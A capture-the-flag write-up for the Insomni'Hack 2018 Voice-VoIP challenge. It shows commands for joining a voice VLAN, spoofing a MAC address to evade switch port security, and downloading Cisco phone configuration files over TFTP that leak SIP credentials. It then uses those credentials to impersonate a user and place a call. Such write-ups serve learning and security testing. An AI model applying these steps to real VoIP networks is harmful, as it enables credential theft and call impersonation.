---
title: Insomni'Hack 2018 - Voice-VoIP
redirect_from: "Writeups/2018/Insomni'hack/voice-voip/"
---

# {{page.title}}
Solves: 6 / Points: 307

## Challenge description
> All the LAN ports are configured for this Cisco VOIP challenge. (this challenge does not work with the Wifi !).
> The characters are based around the film of the Silence of the Lambs [1991].
> The flag is like in the last scene of the film.
> 
> 
> 
> Hint : The voip challenge is on vlan 231 or 232
> 
> Tip : Don't use same MAC address as the Network as some protection and you would trigger turn off your LAN port


## Challenge resolution
The first step is to set up the vlan on our network intertace:
``$ ip link add link enp9s0 name enp9s0.231 type vlan id 231``

Due to security features enabled on the switch, it is mandatory to change the MAC address of the interface before running the DHCP request:
```shell
$ macchanger -r enp9s0.231
$ dhclient -v enp9s0.231
```
The option 128 is present in the DHCP Offer. This option is used to specify TFTP servers available on the network. The TFTP server address is 198.51.100.20, but as there is no file listing on TFTP servers, we need to know the name of the files to download. Common practice is to name the config file with the MAC address of the phone. 
By running nmap on the VOIP subnet, we can identify a Cisco phone at 192.168.231.5 with the following MAC address: 00:1A:2F:CB:72:2A. According to Cisco documentation, the configuration file is named SIP<MAC_ADDRESS>.cnf, let's try to download it:
```shell
$ atftp -g -r SIP001A2FCB722A.cnf 198.51.100.20
$ cat SIP001A2FCB722A.cnf
proxy1_address: "198.51.100.118"

line1_name: "2184"
line1_shortname: "Hannibal Lecter"
line1_displayname: "Hannibal Lecter"
line1_authname: "2184"
line1_password: "kfm8mmd*8"
[...]
```
We now have:
* The IP address of the SIP server: 198.51.100.118
* Hannibal Lecter account:
    * Login: 2184
    * Password: kfm8mmd*8

But we still need to know Clarice's phone number. After an unsuccessful bruteforce to discover new user's phone number using _svwar_ from _Sipvicious_ (who is 2866?), we finally downloaded the default config file from the TFTP server:
```shell
$ atftp -g -r SIPDefault.cnf 198.51.100.20
$ cat SIPDefault.cnf
[...]
#services_url: "http://example.domain.tld/services/menu.xml"
#directory_url: "http://example.domain.tld/services/directory.php"
directory_url: "http://198.51.100.20/directory.xml"
[...]
``` 
Wut! A directory file is present on the TFTP server and it contains the phone number of Clarice:  6834. 
From now, we just need to set up a SIP client, impersonate Hannibal by using previously gathered credentials and call Clarice at 6834@198.51.100.118. A bot answers our call and gives us the flag.



